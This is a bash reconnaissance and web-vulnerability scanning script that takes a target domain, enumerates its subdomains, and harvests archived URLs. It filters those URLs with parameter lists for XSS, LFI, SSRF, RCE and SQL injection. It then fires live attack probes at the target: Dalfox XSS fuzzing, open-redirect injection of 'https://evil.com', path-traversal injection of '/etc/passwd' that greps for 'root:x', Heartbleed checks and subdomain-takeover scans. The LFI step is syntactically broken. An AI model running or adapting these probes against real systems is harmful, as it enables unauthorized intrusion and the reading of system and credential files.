#!/usr/bin/env bash
# @0xJoyghosh
# Email: eng.joyghosh@gmail.com
clear
domain=$1
domainip=$(dig +short $domain)
out=$(pwd)
server=$(curl -s -I $domain | grep "erver")
arecord=$(dig +short $domain A)
mx=$(dig +short $domain MX)
smtp=$(dig +short $domain SMTP)
soa=$(dig +short $domain SOA)
#Patterns
juicy="redirect=|debug|password|passwd|file=|logs|file|fn|include|require|callback|href"
xss="q=|s=|search=|lang=|keyword=|query=|page=|keywords=|year=|view=|email=|type=|name=|p=|callback=|jsonp=|api_key=|api=|password=|email=|emailto=|token=|username=|csrf_token=|unsubscribe_token=|id=|item=|page_id=|month=|immagine=|list_type=|url=|terms=|categoryid=|key=|l=|begindate=|enddate="
lfi="file=|document=|folder=|root=|path=|pg=|style=|pdf=|template=|php_path=|doc=|page=|name=|cat=|dir=|action=|board=|date=|detail=|download=|prefix=|include=|inc=|locate=|show=|site=|type=|view=|content=|layout=|mod=|conf=|url="
debug="access=|admin=|dbg=|debug=|edit=|grant=|test=|alter=|clone=|create=|delete=|disable=|enable=|exec=|execute=|load=|make=|modify=|rename=|reset=|shell=|toggle=|adm=|root=|cfg=|config="
exten="\\.action|\\.adr|\\.ascx|\\.asmx|\\.axd|\\.backup|\\.bak|\\.bkf|\\.bkp|\\.bok|\\.achee|\\.cfg|\\.cfm|\\.cgi|\\.cnf|conf|config|\\.crt|\\.csr|\\.csv|\\.dat|\\.doc|\\.docx|\\.eml|\\.env|\\.exe|\\.gz|\\.ica|\\.inf|\\.ini|\\.java|\\.json|\\.key|\\.log|\\.lst|\\.mai|\\.mbox|\\.mbx|\\.md|\\.mdb|\\.nsf|\\.old|\\.ora|\\.pac|\\.passwd|\\.pcf|\\.pdf|\\.pem|\\.pgp|\\.pl|plist|\\.pwd|\\.rdp|\\.reg|\\.rtf|\\.skr|\\.sql|\\.swf|\\.tpl|\\.txt|\\.url|\\.wml|\\.xls|\\.xlsx|\\.xml|\\.xsd|\\.yml"
ssrf="access=|admin=|dbg=|debug=|edit=|grant=|test=|alter=|clone=|create=|delete=|disable=|enable=|exec=|execute=|load=|make=|modify=|rename=|reset=|shell=|toggle=|adm=|root=|cfg=|dest=|redirect=|uri=|path=|continue=|url=|window=|next=|data=|reference=|site=|html=|val=|validate=|domain=|callback=|return=|page=|feed=|host=|port=|to=|out=|view=|dir=|show=|navigation=|open=|file=|document=|folder=|pg=|php_path=|style=|doc=|img=|filename="
redirect="image_url=|Open=|callback=|cgi-bin/redirect.cgi|cgi-bin/redirect.cgi?|checkout=|checkout_url=|continue=|data=|dest=|destination=|dir=|domain=|feed=|file=|file_name=|file_url=|folder=|folder_url=|forward=|from_url=|go=|goto=|host=|html=|image_url=|img_url=|load_file=|load_url=|login?to=|login_url=|logout=|navigation=|next=|next_page=|out=|page=|page_url=|path=|port=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|reference=|return=|returnTo=|return_path=|return_to=|return_url=|rt=|rurl=|show=|site=|target=|to=|uri=|url=|val=|validate=|view=|window="
sql="id=|select=|report=|role=|update=|query=|user=|name=|sort=|where=|search=|params=|process=|row=|view=|table=|from=|sel=|results=|sleep=|fetch=|order=|keyword=|column=|field=|delete=|string=|number=|filter="
confi="accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert"
rce="daemon=|upload=|dir=|download=|log=|ip=|cli=|cmd=|exec=|command=|execute=|ping=|query=|jump=|code=|reg=|do=|func=|arg=|option=|load=|process=|step=|read=|function|req=|feature=|exe=|module=|payload=|run=|print="
#PATTERNS_ENDS_HERE
mkdir $domain
cd $domain
echo -e """\033[32m
█▄▄ ▄▀█ █░░ █▀▀ █▀█ ▄▄ █▀█ █▀▀ █▀▀ █▀█ █▄░█
█▄█ █▀█ █▄▄ ██▄ █▀▄ ░░ █▀▄ ██▄ █▄▄ █▄█ █░▀█  \033[31m[V1.0][Joy Ghosh] [BETA]
\033[31m________________________________________________________________________
"""
echo -e "\033[31m[+]\033[0m Target: $domain" | tee -a $domain.txt
echo -e "\033[31m[+]\033[0m Target IP: $domainip" | tee -a $domain.txt
echo -e "\033[31m[+]\033[0m Output : $out/$domain" | tee -a $domain.txt
echo -e "\033[31m[+]\033[0m $server" | tee -a $domain.txt
echo -e "\033[31m[+]\033[0m Mx Record: $mx" | tee -a $domain.txt
echo -e "\033[31m[+]\033[0m SMTP IP: $smtp" | tee -a $domain.txt
echo -e "\033[31m[+]\033[0m SOA Record: $soa" | tee -a $domain.txt
echo -e "\033[31m________________________________________________________________________"
echo -e "\033[32m[+]\033[0m Nameservers:- "
whois $domain | grep "Name Server:"| tee -a $domain.txt
echo -e "\033[32m[+]\033[0mSpf Records:-"
nslookup -type=txt $domain | grep "spf" | tee -a $domain.txt
echo -e "\033[31m________________________________________________________________________"
echo -e "\033[32m[+]\033[0m Enumerating Subdomains " | tee -a $domain.txt
echo "---"
echo -e "\033[31m[*]\033[0m RapidDNS.io "
curl -s "https://rapiddns.io/subdomain/$domain?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u | tee -a subdomains
echo -e "\033[31m[*]\033[0m BufferOver.run"
curl -s https://dns.bufferover.run/dns?q=$domain |jq -r .FDNS_A[]|cut -d',' -f2|sort -u | tee -a subdomains
echo -e "\033[31m[*]\033[0m Assetfinder"
assetfinder $domain | sort -u | tee -a subdomains
sort -u subdomains
cat subdomains >> $domain.txt
wcc=$(wc -l < subdomains)
echo "------"
echo -e "\033[31m[#]\033[0m $wcc Subdomains Found " | tee -a $domain.txt
echo "------"
echo -e "\033[31m[#]\033[0m Filtering Resolved Subdomains " | tee -a $domain.txt
echo "------"
while read sub; do  if host $sub &> /dev/null; then    echo "$sub";  fi done < subdomains | tee alive.subdomains
wcd=$(wc -l < alive.subdomains)
echo "------"
echo -e "\033[31m[#]\033[0m $wcd Resolved Subdomains Found " | tee -a $domain.txt
echo "------"
echo -e "\033[32m[+]\033[0mSubdomains A Records " | tee -a $domain.txt
echo "------"
for i in `cat alive.subdomains`; do nslookup $i | grep ^Name -A1| awk '{print $2}';echo;done  | tee -a $domain.txt
echo "------"
echo -e "\033[31m[#]\033[0m Probing For Http/Https Server"
echo "------"
cat alive.subdomains |httprobe | tee htt.subdomains
cat htt.subdomains >> $domain.txt
echo -e "\033[31m________________________________________________________________________"
echo -e "\033[31m[$]\033[0m Getting Subdomains Titles" | tee -a $domain.txt
echo "----"
for i in $(cat alive.subdomains ); do echo "$i | $(curl --connect-timeout 0.5 $i -so - | grep -iPo '(?<=<title>)(.*)(?=</title>)')"; done | tee -a $domain.txt
echo "----"
echo -e "\033[31m________________________________________________________________________"
echo -e "\033[31m[$]\033[0m Scanning For Heartbleed Vulnerability"
cat subdomains | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done | tee -a $domain.txt
echo -e "\033[31m________________________________________________________________________"
echo -e "\033[31m[$]\033[0m Scanning For Subdomain Takeover"
subzy -targets subdomains | tee -a $domain.txt
echo -e "\033[31m________________________________________________________________________"
echo -e "\033[31m[$]\033[0m Getting Url Out Of Sitemap.xml" | tee -a $domain.txt
curl -s -L $domain/sitemap.xml | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | tee sitemap
cat sitemap >> $domain.txt
echo -e "\033[31m________________________________________________________________________"
echo -e "\033[31m[$]\033[0m Extracting Pagelinks [Gau+Waybackurl]"
waybackurls $domain |sort -u| tee -a pagelinks
echo "----"
gau $domain |sort -u| tee -a pagelinks
echo "----"
sort -u pagelinks
cat pagelinks >>$domain.txt
echo -e "\033[31m________________________________________________________________________"
echo -e "\033[31m[$]\033[0m Filtering interesting Pagelinks " | tee -a $domain.txt
echo "----"
cat pagelinks | grep -iE $confi | tee confidential.urls
echo "----"
cat pagelinks | grep -iE $juicy | tee -a confidential.urls
echo "----"
cat confidential.urls >> $domain.txt
echo -e "\033[31m________________________________________________________________________"
echo -e "\033[31m[$]\033[0m Filtering Out Javascript Files From Domain and Subdomain" | tee -a $domain.txt
echo "----"
echo "[MAIN DOMAIN]"
echo "----"
curl -L -s $domain | grep "type=.\?text/javascript.\?" | htmlattribs | sort -u | grep -iE ".js|.json" | tee $domain.scripts
echo "----"
echo -e "\033[31m________________________________________________________________________"
echo -e "\033[31m[$]\033[0m Filtering Out Common Xss Parameter From Pagelink" | tee -a $domain.txt
echo "----"
cat pagelinks | grep -iE $xss | tee xss.$domain
echo "----"
cat xss.$domain >> $domain.txt
echo -e "\033[31m________________________________________________________________________"
echo -e "\033[31m[$]\033[0m Testing Xss With Dalfox " | tee -a $domain.txt
echo "----"
cat xss.$domain | dalfox pipe | tee -a $domain.txt
echo "----"
echo -e "\033[31m________________________________________________________________________"
echo -e "\033[31m[$]\033[0m Filtering Out Common Redirect Parameter From Pagelink" | tee -a $domain.txt
echo "----"
cat pagelinks | grep -iE $redirect | tee redirect.$domain
cat redirect.$domain >> $domain.txt
echo "----"
echo -e "\033[31m________________________________________________________________________"
echo -e "\033[31m[$]\033[0m Testing For OpenRedirect Vulnerability" | tee -a $domain.txt
echo "---"
gau $domain | grep "=" | qsreplace "https://evil.com" | httpx -silent -status-code -location | tee redirect.result
cat redirect.result >> $domain.txt
echo "---"
echo -e "\033[31m________________________________________________________________________"
echo -e "\033[032m[+] Cheaking for LFI Vulnerability:-" | tee -a $domain.txt
echo "---"
gau $domain|grep "="|qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c curl -s "%" 2>&1 | grep -q "root:x" && echo "VULNerable! %"
echo "---"
echo -e "\033[31m________________________________________________________________________"
echo -e "\033[032m[+]\033[0mFiltering common Ssrf Parameters From pagelinks:-"
cat pagelinks | grep -iE $ssrf | tee $domain.ssrf-para
echo -e "\033[31m________________________________________________________________________"
echo -e "\033[032m[+]\033[0mFiltering common lfi Parameters From pagelinks:-"
cat pagelinks | grep -iE $lfi | tee $domain.lfi-para
echo -e "\033[31m________________________________________________________________________"
echo -e "\033[032m[+]\033[0mFiltering common rce Parameters From pagelinks:-"
cat pagelinks | grep -iE $rce | tee $domain.rce-para
echo -e "\033[31m________________________________________________________________________"
echo -e "\033[032m[+]\033[0mFiltering common Debug Parameters From pagelinks:-"
cat pagelinks | grep -iE $debug | tee $domain.debug-para
echo -e "\033[31m________________________________________________________________________"
echo -e "\033[032m[+]\033[0mFiltering common sql Parameters From pagelinks:-"
cat pagelinks | grep -iE $sql | tee $domain.redirect-para
echo -e "\033[31m________________________________________________________________________"
